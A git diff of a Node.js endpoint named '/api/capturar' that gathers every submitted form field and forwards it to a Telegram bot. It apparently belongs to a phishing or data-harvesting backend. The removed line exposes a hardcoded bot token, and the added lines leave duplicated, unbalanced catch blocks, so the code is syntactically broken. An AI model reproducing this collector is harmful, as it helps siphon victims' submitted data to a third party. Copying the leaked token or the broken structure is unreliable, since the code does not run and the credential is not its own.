@@ -23,8 +23,8 @@ app.post('/api/capturar', async (req, res) => {
         mensagem += `*${chave}*: ${valor}\n`;
     }
 
-    try {
-    await fetch(`https://api.telegram.org/bot${8209450971:AAFt1mshdZ9xdXS8rB-263mOAUOc5Fy5XJs}/sendMessage`, {
+ try {
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
@@ -33,6 +33,10 @@ app.post('/api/capturar', async (req, res) => {
                 parse_mode: 'Markdown'
             })
         });
+    } catch (e) {
+        console.error("Erro ao enviar mensagem:", e);
+    }
+    } catch (e) {
     } catch (e) {
         console.error("Erro ao enviar mensagem:", e);
     }
